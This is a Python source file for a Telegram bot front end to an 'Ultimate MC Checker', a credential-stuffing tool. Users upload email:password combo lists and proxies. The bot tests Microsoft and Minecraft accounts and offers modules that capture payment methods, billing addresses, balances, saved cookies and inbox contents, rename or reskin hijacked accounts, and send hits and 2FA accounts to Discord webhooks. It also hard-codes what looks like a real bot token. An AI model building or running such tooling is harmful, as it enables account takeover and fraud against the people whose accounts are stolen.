import os
import asyncio
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.utils.keyboard import InlineKeyboardBuilder
from database import Database

TOKEN = os.getenv("BOT_TOKEN", "8459126546:AAHN9oT3OzcM74yHPINr7mjJWHTyYbvkn_g")
ADMIN_ID = int(os.getenv("ADMIN_ID", "5944410248"))

bot = Bot(token=TOKEN)
dp = Dispatcher()
db = Database()

# State tracking for text input flows
_waiting_state = {}  # user_id -> state_name

VERSION = '2.0'

def get_main_keyboard(user_id):
    builder = InlineKeyboardBuilder()
    builder.row(
        types.InlineKeyboardButton(text="🎯 Check", callback_data="how_to_check"),
        types.InlineKeyboardButton(text="⚙️ Configure", callback_data="configure"),
    )
    builder.row(
        types.InlineKeyboardButton(text="📊 Stats", callback_data="my_stats"),
        types.InlineKeyboardButton(text="👤 Profile", callback_data="profile"),
    )
    builder.row(types.InlineKeyboardButton(text="❓ Help", callback_data="help_menu"))
    if user_id == ADMIN_ID:
        builder.row(types.InlineKeyboardButton(text="👑 Admin Panel", callback_data="admin_panel"))
    return builder.as_markup()

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    user_id = message.from_user.id
    user = db.get_user(user_id)
    if not user:
        db.add_user(user_id, message.from_user.username, message.from_user.full_name)
        if user_id != ADMIN_ID:
            try:
                await bot.send_message(
                    ADMIN_ID,
                    f"🆕 <b>New Auth Request</b>\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"👤 User: @{message.from_user.username}\n"
                    f"🆔 ID: <code>{user_id}</code>\n"
                    f"📛 Name: {message.from_user.full_name}\n"
                    f"━━━━━━━━━━━━━━━━━━",
                    parse_mode="HTML"
                )
            except Exception:
                pass
            await message.reply(
                "👋 <b>Welcome to Ultimate MC Checker!</b>\n\n"
                "Your access request has been sent to the admin.\n"
                "You'll be notified once approved.",
                parse_mode="HTML"
            )
            return
        else:
            db.update_user_role(user_id, 'admin')
    user = db.get_user(user_id)
    if user[3] == 'pending' and user_id != ADMIN_ID:
        await message.reply(
            "⏳ <b>Pending Approval</b>\n\n"
            "Your access is still pending admin review.\n"
            "Please wait for authorization.",
            parse_mode="HTML"
        )
        return
    if user[3] == 'banned':
        await message.reply("🚫 You are banned from using this bot.")
        return
    stats = db.get_user_stats(user_id)
    total = stats[1] if stats else 0
    hits = stats[2] if stats else 0
    role_badge = '👑' if user[3] == 'admin' else '⭐'
    await message.reply(
        f"╔══════════════════════════╗\n"
        f"  ⚡ <b>Ultimate MC Checker v{VERSION}</b>\n"
        f"╚══════════════════════════╝\n\n"
        f"Welcome back, <b>{message.from_user.first_name}</b>! {role_badge}\n\n"
        f"📊 <b>Quick Stats:</b>\n"
        f"  ├ 🔄 Checked: <code>{total:,}</code>\n"
        f"  ├ 🎯 Hits: <code>{hits:,}</code>\n"
        f"  └ 📈 Hit Rate: <code>{(hits/total*100) if total > 0 else 0:.1f}%</code>\n\n"
        f"📎 Send a <b>.txt combo file</b> to start checking!\n\n"
        f"<i>Credits: @akaza_isnt</i>",
        parse_mode="HTML", reply_markup=get_main_keyboard(user_id)
    )

@dp.message(Command("help"))
async def cmd_help(message: types.Message):
    await message.reply(
        f"❓ <b>Help — Ultimate MC Checker v{VERSION}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"<b>How to use:</b>\n"
        f"1️⃣ Send a <code>.txt</code> file with combos (email:pass)\n"
        f"2️⃣ Optionally send a proxy file, or /noproxy\n"
        f"3️⃣ Bot checks accounts and sends results\n\n"
        f"<b>Commands:</b>\n"
        f"  /start — Main menu\n"
        f"  /help — This help message\n"
        f"  /noproxy — Check without proxies\n\n"
        f"<b>Captures include:</b>\n"
        f"  • Minecraft entitlements (Normal/GamePass/Hypixel)\n"
        f"  • Hypixel stats, BW/SW stars, Skyblock NW\n"
        f"  • DonutSMP stats (kills, money, playtime)\n"
        f"  • Optifine cape, name change status\n"
        f"  • MS Balance, Rewards, Payment Methods\n"
        f"  • Email access, Inbox scan, Subscriptions\n"
        f"  • Buddy pass codes, Cookie saving\n"
        f"  • Auto name/skin, Discord webhooks\n\n"
        f"<i>Credits: @akaza_isnt</i>",
        parse_mode="HTML", reply_markup=get_main_keyboard(message.from_user.id)
    )

@dp.callback_query(F.data == "how_to_check")
async def how_to_check(callback: types.CallbackQuery):
    await callback.message.edit_text(
        "🎯 <b>How to Check Accounts</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "<b>Step 1:</b> Send a <code>.txt</code> file with combos\n"
        "  Format: <code>email:password</code> (one per line)\n\n"
        "<b>Step 2:</b> Send proxy file or use /noproxy\n"
        "  Supports HTTP/SOCKS4/SOCKS5 proxies\n\n"
        "<b>Step 3:</b> Bot queues and checks automatically\n"
        "  Live progress bar updates every 5s\n\n"
        "<b>Step 4:</b> Results delivered as files\n"
        "  Hits, captures, and categorized output\n\n"
        "💡 <b>Tip:</b> Configure capture modules in ⚙️ Settings\n"
        "to customize what data gets collected!",
        parse_mode="HTML",
        reply_markup=InlineKeyboardBuilder().row(
            types.InlineKeyboardButton(text="🔙 Back", callback_data="back_to_main")
        ).as_markup()
    )

@dp.callback_query(F.data == "help_menu")
async def help_menu(callback: types.CallbackQuery):
    await callback.message.edit_text(
        f"❓ <b>Help — Ultimate MC Checker v{VERSION}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"<b>Commands:</b>\n"
        f"  /start — Main menu\n"
        f"  /help — Help message\n"
        f"  /noproxy — Check without proxies\n\n"
        f"<b>Supported Captures:</b>\n"
        f"  🎮 Minecraft entitlements\n"
        f"  📊 Hypixel stats & rankings\n"
        f"  🍩 DonutSMP stats\n"
        f"  🧢 Optifine cape detection\n"
        f"  💰 MS Balance & Rewards\n"
        f"  💳 Payment methods & billing\n"
        f"  📧 Email access & inbox scan\n"
        f"  🎁 Buddy pass codes\n"
        f"  🔄 Auto name/skin change\n\n"
        f"<i>Credits: @akaza_isnt</i>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardBuilder().row(
            types.InlineKeyboardButton(text="🔙 Back", callback_data="back_to_main")
        ).as_markup()
    )

@dp.callback_query(F.data == "profile")
async def process_profile(callback: types.CallbackQuery):
    user = db.get_user(callback.from_user.id)
    stats = db.get_user_stats(callback.from_user.id)
    total = stats[1] if stats else 0
    hits = stats[2] if stats else 0
    bad = stats[3] if stats else 0
    errors = stats[4] if stats else 0
    hit_rate = (hits / total * 100) if total > 0 else 0
    role_icons = {'admin': '👑', 'authorized': '⭐', 'pending': '⏳', 'banned': '🚫'}
    role_icon = role_icons.get(user[3], '👤')
    text = (
        f"{role_icon} <b>Profile — {user[2]}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"  🆔 ID: <code>{user[0]}</code>\n"
        f"  📛 Name: {user[2]}\n"
        f"  👤 Username: @{user[1] or 'N/A'}\n"
        f"  🎖 Role: <b>{user[3].upper()}</b>\n"
        f"  📅 Joined: {user[4]}\n\n"
        f"📊 <b>Lifetime Performance:</b>\n"
        f"  ┌ 🔄 Total Checked: <code>{total:,}</code>\n"
        f"  ├ 🎯 Hits: <code>{hits:,}</code>\n"
        f"  ├ ❌ Bad: <code>{bad:,}</code>\n"
        f"  ├ ⚠️ Errors: <code>{errors:,}</code>\n"
        f"  └ 📈 Hit Rate: <code>{hit_rate:.1f}%</code>\n\n"
        f"<i>Credits: @akaza_isnt</i>"
    )
    builder = InlineKeyboardBuilder()
    builder.row(types.InlineKeyboardButton(text="📊 Detailed Stats", callback_data="my_stats"))
    builder.row(types.InlineKeyboardButton(text="🔙 Back", callback_data="back_to_main"))
    await callback.message.edit_text(text, parse_mode="HTML", reply_markup=builder.as_markup())

@dp.callback_query(F.data == "my_stats")
async def process_my_stats(callback: types.CallbackQuery):
    stats = db.get_user_stats(callback.from_user.id)
    total = stats[1] if stats else 0
    hits = stats[2] if stats else 0
    bad = stats[3] if stats else 0
    errors = stats[4] if stats else 0
    hit_rate = (hits / total * 100) if total > 0 else 0
    good_rate = ((hits + bad) / total * 100) if total > 0 else 0
    # Visual hit rate bar
    bar_len = 20
    filled = int(bar_len * hit_rate / 100)
    bar = '█' * filled + '░' * (bar_len - filled)
    text = (
        f"📊 <b>Detailed Statistics</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"<b>Account Breakdown:</b>\n"
        f"  ┌ 🔄 Total Checked: <code>{total:,}</code>\n"
        f"  ├ 🎯 Hits: <code>{hits:,}</code>\n"
        f"  ├ ❌ Bad: <code>{bad:,}</code>\n"
        f"  └ ⚠️ Errors: <code>{errors:,}</code>\n\n"
        f"<b>Performance:</b>\n"
        f"  📈 Hit Rate: <code>{hit_rate:.2f}%</code>\n"
        f"  [{bar}]\n"
        f"  🎯 Valid Rate: <code>{good_rate:.1f}%</code>\n\n"
        f"<i>Credits: @akaza_isnt</i>"
    )
    builder = InlineKeyboardBuilder()
    builder.row(types.InlineKeyboardButton(text="👤 Profile", callback_data="profile"))
    builder.row(types.InlineKeyboardButton(text="🔙 Back", callback_data="back_to_main"))
    await callback.message.edit_text(text, parse_mode="HTML", reply_markup=builder.as_markup())

# ─────────────────────────── CONFIGURE ───────────────────────────

@dp.callback_query(F.data == "configure")
async def process_configure(callback: types.CallbackQuery):
    s = db.get_settings(callback.from_user.id)
    # Count enabled capture modules
    cap_fields = [
        s.cap_hypixel_stats, s.cap_hypixel_plancke, s.cap_ban_check,
        s.cap_optifine_cape, s.cap_name_change, s.cap_email_access,
        s.cap_ms_balance, s.cap_rewards_points, s.cap_payment_methods,
        s.cap_billing_address, s.cap_subscriptions, s.cap_donut_stats,
        s.cap_inbox_scan, s.cap_buddy_pass, s.cap_save_cookies,
        s.cap_auto_name, s.cap_auto_skin,
    ]
    enabled = sum(1 for c in cap_fields if c)
    builder = InlineKeyboardBuilder()
    builder.row(
        types.InlineKeyboardButton(text=f"🎯 Captures ({enabled}/17)", callback_data="cfg_captures"),
        types.InlineKeyboardButton(text="⚡ Basic", callback_data="cfg_basic"),
    )
    builder.row(
        types.InlineKeyboardButton(text="📬 Inbox", callback_data="cfg_inbox"),
        types.InlineKeyboardButton(text="🔔 Webhooks", callback_data="cfg_discord"),
    )
    builder.row(
        types.InlineKeyboardButton(text="🎮 Auto Ops", callback_data="cfg_autoops"),
        types.InlineKeyboardButton(text="🌐 Proxy", callback_data="cfg_proxy"),
    )
    builder.row(types.InlineKeyboardButton(text="🔙 Back", callback_data="back_to_main"))
    await callback.message.edit_text(
        "⚙️ <b>Configuration Center</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📡 Capture modules: <b>{enabled}</b> active\n"
        f"🧵 Threads: <b>{s.threads}</b>\n"
        f"📦 Output: <b>{s.file_format.upper()}</b> / <b>{s.result_type.upper()}</b>\n"
        f"🌐 Auto Proxy: <b>{'ON' if s.auto_proxy else 'OFF'}</b>\n\n"
        "Select a category to configure:",
        parse_mode="HTML", reply_markup=builder.as_markup()
    )

@dp.callback_query(F.data == "cfg_basic")
async def cfg_basic(callback: types.CallbackQuery):
    s = db.get_settings(callback.from_user.id)
    builder = InlineKeyboardBuilder()
    builder.row(types.InlineKeyboardButton(text=f"🔔 Hit Notifications: {'ON' if s.hit_notifications else 'OFF'}", callback_data="toggle_notif"))
    builder.row(types.InlineKeyboardButton(text=f"📄 Results: {s.result_type.upper()}", callback_data="toggle_res_type"))
    builder.row(types.InlineKeyboardButton(text=f"📦 Format: {s.file_format.upper()}", callback_data="toggle_format"))
    builder.row(types.InlineKeyboardButton(text=f"🧵 Threads: {s.threads}", callback_data="set_threads"))
    builder.row(types.InlineKeyboardButton(text="🔙 Back", callback_data="configure"))
    await callback.message.edit_text("⚡ <b>Basic Settings</b>", parse_mode="HTML", reply_markup=builder.as_markup())

@dp.callback_query(F.data == "cfg_captures")
async def cfg_captures(callback: types.CallbackQuery):
    s = db.get_settings(callback.from_user.id)
    def _btn(label, col, val):
        icon = "🟢" if val else "🔴"
        return types.InlineKeyboardButton(text=f"{icon} {label}", callback_data=f"toggle_cap_{col}")
    builder = InlineKeyboardBuilder()
    builder.row(_btn("Hypixel Stats", "cap_hypixel_stats", s.cap_hypixel_stats),
                _btn("Plancke", "cap_hypixel_plancke", s.cap_hypixel_plancke))
    builder.row(_btn("Ban Check", "cap_ban_check", s.cap_ban_check),
                _btn("OF Cape", "cap_optifine_cape", s.cap_optifine_cape))
    builder.row(_btn("Name Change", "cap_name_change", s.cap_name_change),
                _btn("Email Access", "cap_email_access", s.cap_email_access))
    builder.row(_btn("MS Balance", "cap_ms_balance", s.cap_ms_balance),
                _btn("Rewards", "cap_rewards_points", s.cap_rewards_points))
    builder.row(_btn("Payments", "cap_payment_methods", s.cap_payment_methods),
                _btn("Billing", "cap_billing_address", s.cap_billing_address))
    builder.row(_btn("Subs", "cap_subscriptions", s.cap_subscriptions),
                _btn("DonutSMP", "cap_donut_stats", s.cap_donut_stats))
    builder.row(_btn("Inbox Scan", "cap_inbox_scan", s.cap_inbox_scan),
                _btn("Buddy Pass", "cap_buddy_pass", s.cap_buddy_pass))
    builder.row(_btn("Cookies", "cap_save_cookies", s.cap_save_cookies),
                _btn("Auto Name", "cap_auto_name", s.cap_auto_name))
    builder.row(_btn("Auto Skin", "cap_auto_skin", s.cap_auto_skin))
    cap_fields = [
        s.cap_hypixel_stats, s.cap_hypixel_plancke, s.cap_ban_check,
        s.cap_optifine_cape, s.cap_name_change, s.cap_email_access,
        s.cap_ms_balance, s.cap_rewards_points, s.cap_payment_methods,
        s.cap_billing_address, s.cap_subscriptions, s.cap_donut_stats,
        s.cap_inbox_scan, s.cap_buddy_pass, s.cap_save_cookies,
        s.cap_auto_name, s.cap_auto_skin,
    ]
    enabled = sum(1 for c in cap_fields if c)
    builder.row(types.InlineKeyboardButton(text="🔙 Back", callback_data="configure"))
    await callback.message.edit_text(
        f"🎯 <b>Capture Modules</b> — {enabled}/17 active\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"Toggle modules to customize what data\n"
        f"gets captured for each account hit.\n\n"
        f"🟢 = Enabled  🔴 = Disabled",
        parse_mode="HTML", reply_markup=builder.as_markup()
    )

@dp.callback_query(F.data.startswith("toggle_cap_"))
async def toggle_capture_module(callback: types.CallbackQuery):
    col = callback.data.replace("toggle_cap_", "")
    s = db.get_settings(callback.from_user.id)
    current = getattr(s, col, 0)
    db.update_settings(callback.from_user.id, **{col: 0 if current else 1})
    await cfg_captures(callback)

@dp.callback_query(F.data == "cfg_inbox")
async def cfg_inbox(callback: types.CallbackQuery):
    s = db.get_settings(callback.from_user.id)
    builder = InlineKeyboardBuilder()
    builder.row(types.InlineKeyboardButton(text="✏️ Set Keywords", callback_data="set_inbox_keywords"))
    builder.row(types.InlineKeyboardButton(text="🔙 Back", callback_data="configure"))
    await callback.message.edit_text(
        f"📬 <b>Inbox Keywords</b>\nCurrent: <code>{s.inbox_keywords}</code>\n\nComma-separated keywords to search in Outlook inbox.",
        parse_mode="HTML", reply_markup=builder.as_markup()
    )

@dp.callback_query(F.data == "set_inbox_keywords")
async def set_inbox_keywords_prompt(callback: types.CallbackQuery):
    _waiting_state[callback.from_user.id] = 'inbox_keywords'
    await callback.message.edit_text("✏️ Send your inbox keywords (comma-separated):\nExample: <code>Steam,Netflix,Xbox,PayPal</code>", parse_mode="HTML")

@dp.callback_query(F.data == "cfg_discord")
async def cfg_discord(callback: types.CallbackQuery):
    s = db.get_settings(callback.from_user.id)
    def _wh(label, key):
        val = getattr(s, key, '') or ''
        status = "✅ Set" if val else "❌ Not set"
        return types.InlineKeyboardButton(text=f"{label}: {status}", callback_data=f"set_wh_{key}")
    builder = InlineKeyboardBuilder()
    builder.row(_wh("🎯 Hits Webhook", "discord_webhook_hits"))
    builder.row(_wh("🔐 2FA Webhook", "discord_webhook_2fa"))
    builder.row(_wh("🎮 Xbox Webhook", "discord_webhook_xbox"))
    builder.row(_wh("📦 Other Webhook", "discord_webhook_other"))
    embed_icon = "✅" if s.discord_embed_mode else "❌"
    builder.row(types.InlineKeyboardButton(text=f"{embed_icon} Embed Mode", callback_data="toggle_embed_mode"))
    builder.row(types.InlineKeyboardButton(text="🔙 Back", callback_data="configure"))
    await callback.message.edit_text("🔔 <b>Discord Webhooks</b>", parse_mode="HTML", reply_markup=builder.as_markup())

@dp.callback_query(F.data.startswith("set_wh_"))
async def set_webhook_prompt(callback: types.CallbackQuery):
    key = callback.data.replace("set_wh_", "")
    _waiting_state[callback.from_user.id] = f'webhook_{key}'
    await callback.message.edit_text(f"🔗 Send the Discord webhook URL for <b>{key}</b>:\nSend <code>clear</code> to remove it.", parse_mode="HTML")

@dp.callback_query(F.data == "toggle_embed_mode")
async def toggle_embed_mode(callback: types.CallbackQuery):
    s = db.get_settings(callback.from_user.id)
    db.update_settings(callback.from_user.id, discord_embed_mode=0 if s.discord_embed_mode else 1)
    await cfg_discord(callback)

@dp.callback_query(F.data == "cfg_autoops")
async def cfg_autoops(callback: types.CallbackQuery):
    s = db.get_settings(callback.from_user.id)
    builder = InlineKeyboardBuilder()
    builder.row(types.InlineKeyboardButton(text=f"📝 Name Format: {s.auto_name_format}", callback_data="set_name_format"))
    builder.row(types.InlineKeyboardButton(text="🖼 Set Skin URL", callback_data="set_skin_url"))
    builder.row(types.InlineKeyboardButton(text=f"👕 Variant: {s.auto_skin_variant}", callback_data="toggle_skin_variant"))
    builder.row(types.InlineKeyboardButton(text="🔙 Back", callback_data="configure"))
    await callback.message.edit_text("🎮 <b>Auto Name/Skin</b>", parse_mode="HTML", reply_markup=builder.as_markup())

@dp.callback_query(F.data == "set_name_format")
async def set_name_format_prompt(callback: types.CallbackQuery):
    _waiting_state[callback.from_user.id] = 'auto_name_format'
    await callback.message.edit_text("📝 Send the name format.\nUse <code>{random_letter}</code> and <code>{random_number}</code> as placeholders.\nExample: <code>Bot_{random_letter}_{random_number}</code>", parse_mode="HTML")

@dp.callback_query(F.data == "set_skin_url")
async def set_skin_url_prompt(callback: types.CallbackQuery):
    _waiting_state[callback.from_user.id] = 'auto_skin_url'
    await callback.message.edit_text("🖼 Send the skin URL (must be a direct image URL):")

@dp.callback_query(F.data == "toggle_skin_variant")
async def toggle_skin_variant(callback: types.CallbackQuery):
    s = db.get_settings(callback.from_user.id)
    new_variant = 'slim' if s.auto_skin_variant == 'classic' else 'classic'
    db.update_settings(callback.from_user.id, auto_skin_variant=new_variant)
    await cfg_autoops(callback)

@dp.callback_query(F.data == "cfg_proxy")
async def cfg_proxy(callback: types.CallbackQuery):
    s = db.get_settings(callback.from_user.id)
    auto_icon = "✅" if s.auto_proxy else "❌"
    builder = InlineKeyboardBuilder()
    builder.row(types.InlineKeyboardButton(text=f"{auto_icon} Auto Proxy Scraping", callback_data="toggle_auto_proxy"))
    builder.row(types.InlineKeyboardButton(text=f"⏱ Refresh: {s.proxy_refresh_minutes} min", callback_data="set_proxy_refresh"))
    builder.row(types.InlineKeyboardButton(text="🔙 Back", callback_data="configure"))
    await callback.message.edit_text("🌐 <b>Auto Proxy</b>", parse_mode="HTML", reply_markup=builder.as_markup())

@dp.callback_query(F.data == "toggle_auto_proxy")
async def toggle_auto_proxy(callback: types.CallbackQuery):
    s = db.get_settings(callback.from_user.id)
    db.update_settings(callback.from_user.id, auto_proxy=0 if s.auto_proxy else 1)
    await cfg_proxy(callback)

@dp.callback_query(F.data == "set_proxy_refresh")
async def set_proxy_refresh_prompt(callback: types.CallbackQuery):
    _waiting_state[callback.from_user.id] = 'proxy_refresh_minutes'
    await callback.message.edit_text("⏱ Send the proxy refresh interval in minutes (e.g. <code>5</code>):", parse_mode="HTML")

# ─────────────────────────── BASIC TOGGLES ───────────────────────────

@dp.callback_query(F.data == "toggle_notif")
async def toggle_notif(callback: types.CallbackQuery):
    s = db.get_settings(callback.from_user.id)
    db.update_settings(callback.from_user.id, hit_notifications=0 if s.hit_notifications else 1)
    await cfg_basic(callback)

@dp.callback_query(F.data == "toggle_res_type")
async def toggle_res_type(callback: types.CallbackQuery):
    s = db.get_settings(callback.from_user.id)
    db.update_settings(callback.from_user.id, result_type="hits" if s.result_type == "all" else "all")
    await cfg_basic(callback)

@dp.callback_query(F.data == "toggle_format")
async def toggle_format(callback: types.CallbackQuery):
    s = db.get_settings(callback.from_user.id)
    db.update_settings(callback.from_user.id, file_format="zip" if s.file_format == "txt" else "txt")
    await cfg_basic(callback)

@dp.callback_query(F.data == "set_threads")
async def set_threads_prompt(callback: types.CallbackQuery):
    _waiting_state[callback.from_user.id] = 'threads'
    user = db.get_user(callback.from_user.id)
    max_t = 20 if user[3] == 'admin' else 10
    await callback.message.edit_text(
        f"🧵 Send the number of threads (1-{max_t}):\n\n"
        f"<i>⚠️ Higher threads = higher CPM = higher IP ban risk.\n"
        f"Recommended: 3-5 for accuracy, 10 max for speed.</i>",
        parse_mode="HTML"
    )

# ─────────────────────────── TEXT INPUT HANDLER ───────────────────────────

@dp.message(lambda m: m.from_user.id in _waiting_state)
async def handle_text_input(message: types.Message):
    user_id = message.from_user.id
    state = _waiting_state.pop(user_id, None)
    if not state:
        return
    text = message.text.strip()

    if state == 'threads':
        try:
            val = max(1, min(int(text), 20 if db.get_user(user_id)[3] == 'admin' else 10))
            db.update_settings(user_id, threads=val)
            await message.reply(f"✅ Threads set to {val}.", reply_markup=get_main_keyboard(user_id))
        except ValueError:
            await message.reply("⚠️ Invalid number.")

    elif state == 'inbox_keywords':
        db.update_settings(user_id, inbox_keywords=text)
        await message.reply(f"✅ Inbox keywords updated: <code>{text}</code>", parse_mode="HTML", reply_markup=get_main_keyboard(user_id))

    elif state.startswith('webhook_'):
        col = state.replace('webhook_', '')
        val = '' if text.lower() == 'clear' else text
        db.update_settings(user_id, **{col: val})
        await message.reply(f"✅ Webhook {'cleared' if not val else 'updated'}.", reply_markup=get_main_keyboard(user_id))

    elif state == 'auto_name_format':
        db.update_settings(user_id, auto_name_format=text)
        await message.reply(f"✅ Name format set to: <code>{text}</code>", parse_mode="HTML", reply_markup=get_main_keyboard(user_id))

    elif state == 'auto_skin_url':
        db.update_settings(user_id, auto_skin_url=text)
        await message.reply("✅ Skin URL updated.", reply_markup=get_main_keyboard(user_id))

    elif state == 'proxy_refresh_minutes':
        try:
            val = max(1, int(text))
            db.update_settings(user_id, proxy_refresh_minutes=val)
            await message.reply(f"✅ Proxy refresh set to {val} minutes.", reply_markup=get_main_keyboard(user_id))
        except ValueError:
            await message.reply("⚠️ Invalid number.")

    elif state == 'donut_api_key':
        db.update_settings(user_id, donut_api_key=text)
        await message.reply("✅ DonutSMP API key updated.", reply_markup=get_main_keyboard(user_id))

    elif state == 'broadcast':
        if user_id != ADMIN_ID:
            return
        authorized = db.get_all_authorized_users()
        sent = 0
        for uid in authorized:
            try:
                await bot.send_message(uid, f"📢 <b>Admin Broadcast:</b>\n{text}", parse_mode="HTML")
                sent += 1
            except Exception:
                pass
        await message.reply(f"✅ Broadcast sent to {sent} users.")

    elif state == 'ban_user_id':
        if user_id != ADMIN_ID:
            return
        try:
            target_id = int(text)
            target = db.get_user(target_id)
            if not target:
                await message.reply("⚠️ User not found.")
                return
            new_role = 'authorized' if target[3] == 'banned' else 'banned'
            db.update_user_role(target_id, new_role)
            await message.reply(f"✅ User {target_id} is now <b>{new_role}</b>.", parse_mode="HTML")
            try:
                msg = "✅ Your access has been restored." if new_role == 'authorized' else "🚫 You have been banned."
                await bot.send_message(target_id, msg)
            except Exception:
                pass
        except ValueError:
            await message.reply("⚠️ Invalid user ID.")

# ─────────────────────────── ADMIN PANEL ───────────────────────────

@dp.callback_query(F.data == "admin_panel")
async def admin_panel(callback: types.CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return
    global_stats = db.get_global_stats()
    users = db.get_all_users()
    pending = [u for u in users if u[2] == 'pending']
    authorized = [u for u in users if u[2] == 'authorized']
    banned = [u for u in users if u[2] == 'banned']
    g_total = global_stats[1] if global_stats else 0
    g_hits = global_stats[2] if global_stats else 0
    g_bad = global_stats[3] if global_stats else 0
    g_errors = global_stats[4] if global_stats else 0
    g_rate = (g_hits / g_total * 100) if g_total > 0 else 0
    text = (
        f"👑 <b>Admin Control Panel</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🌍 <b>Global Statistics:</b>\n"
        f"  ┌ 🔄 Total Checked: <code>{g_total:,}</code>\n"
        f"  ├ 🎯 Hits: <code>{g_hits:,}</code>\n"
        f"  ├ ❌ Bad: <code>{g_bad:,}</code>\n"
        f"  ├ ⚠️ Errors: <code>{g_errors:,}</code>\n"
        f"  └ 📈 Hit Rate: <code>{g_rate:.2f}%</code>\n\n"
        f"👥 <b>User Breakdown:</b>\n"
        f"  ├ Total: <b>{len(users)}</b>\n"
        f"  ├ ✅ Authorized: <b>{len(authorized)}</b>\n"
        f"  ├ ⏳ Pending: <b>{len(pending)}</b>\n"
        f"  └ 🚫 Banned: <b>{len(banned)}</b>\n"
    )
    builder = InlineKeyboardBuilder()
    builder.row(
        types.InlineKeyboardButton(text=f"⏳ Pending ({len(pending)})", callback_data="manage_pending"),
        types.InlineKeyboardButton(text="🚫 Ban/Unban", callback_data="admin_ban_user"),
    )
    builder.row(
        types.InlineKeyboardButton(text="👥 Users", callback_data="admin_user_list"),
        types.InlineKeyboardButton(text="📢 Broadcast", callback_data="admin_broadcast"),
    )
    builder.row(types.InlineKeyboardButton(text="🔙 Back", callback_data="back_to_main"))
    await callback.message.edit_text(text, parse_mode="HTML", reply_markup=builder.as_markup())

@dp.callback_query(F.data == "manage_pending")
async def manage_pending(callback: types.CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return
    users = db.get_all_users()
    pending = [u for u in users if u[2] == 'pending']
    if not pending:
        await callback.answer("No pending requests.", show_alert=True)
        return
    builder = InlineKeyboardBuilder()
    for u in pending:
        builder.row(types.InlineKeyboardButton(text=f"✅ {u[1] or u[0]} ({u[0]})", callback_data=f"auth_{u[0]}"))
    builder.row(types.InlineKeyboardButton(text="🔙 Back", callback_data="admin_panel"))
    await callback.message.edit_text("⏳ <b>Pending Requests</b>", parse_mode="HTML", reply_markup=builder.as_markup())

@dp.callback_query(F.data.startswith("auth_"))
async def authorize_user(callback: types.CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return
    user_id = int(callback.data.split("_")[1])
    db.update_user_role(user_id, 'authorized')
    try:
        await bot.send_message(user_id, "✅ Your access has been authorized! Send /start to begin.")
    except Exception:
        pass
    await callback.answer(f"User {user_id} authorized.")
    await manage_pending(callback)

@dp.callback_query(F.data == "admin_ban_user")
async def admin_ban_user(callback: types.CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return
    _waiting_state[callback.from_user.id] = 'ban_user_id'
    await callback.message.edit_text("🚫 Send the Telegram user ID to ban/unban:")

@dp.callback_query(F.data == "admin_user_list")
async def admin_user_list(callback: types.CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return
    users = db.get_all_users()
    role_icons = {'admin': '👑', 'authorized': '✅', 'pending': '⏳', 'banned': '🚫'}
    lines = ["👥 <b>User List</b>", "━━━━━━━━━━━━━━━━━━━━━━━━━━━━", ""]
    for u in users[:30]:
        stats = db.get_user_stats(u[0])
        hits = stats[2] if stats else 0
        total = stats[1] if stats else 0
        icon = role_icons.get(u[2], '❓')
        lines.append(f"{icon} @{u[1] or 'N/A'} — <code>{hits:,}</code> hits / <code>{total:,}</code> total")
    if len(users) > 30:
        lines.append(f"\n<i>... and {len(users) - 30} more users</i>")
    builder = InlineKeyboardBuilder()
    builder.row(types.InlineKeyboardButton(text="🔙 Back", callback_data="admin_panel"))
    await callback.message.edit_text('\n'.join(lines), parse_mode="HTML", reply_markup=builder.as_markup())

@dp.callback_query(F.data == "admin_broadcast")
async def admin_broadcast(callback: types.CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return
    _waiting_state[callback.from_user.id] = 'broadcast'
    await callback.message.edit_text("📢 Send the message to broadcast to all authorized users:")

@dp.callback_query(F.data == "back_to_main")
async def back_to_main(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    stats = db.get_user_stats(user_id)
    total = stats[1] if stats else 0
    hits = stats[2] if stats else 0
    user = db.get_user(user_id)
    role_badge = '👑' if user and user[3] == 'admin' else '⭐'
    await callback.message.edit_text(
        f"╔══════════════════════════╗\n"
        f"  ⚡ <b>Ultimate MC Checker v{VERSION}</b>\n"
        f"╚══════════════════════════╝\n\n"
        f"Welcome back, <b>{callback.from_user.first_name}</b>! {role_badge}\n\n"
        f"📊 <b>Quick Stats:</b>\n"
        f"  ├ 🔄 Checked: <code>{total:,}</code>\n"
        f"  ├ 🎯 Hits: <code>{hits:,}</code>\n"
        f"  └ 📈 Hit Rate: <code>{(hits/total*100) if total > 0 else 0:.1f}%</code>\n\n"
        f"📎 Send a <b>.txt combo file</b> to start checking!\n\n"
        f"<i>Credits: @akaza_isnt</i>",
        parse_mode="HTML", reply_markup=get_main_keyboard(user_id)
    )
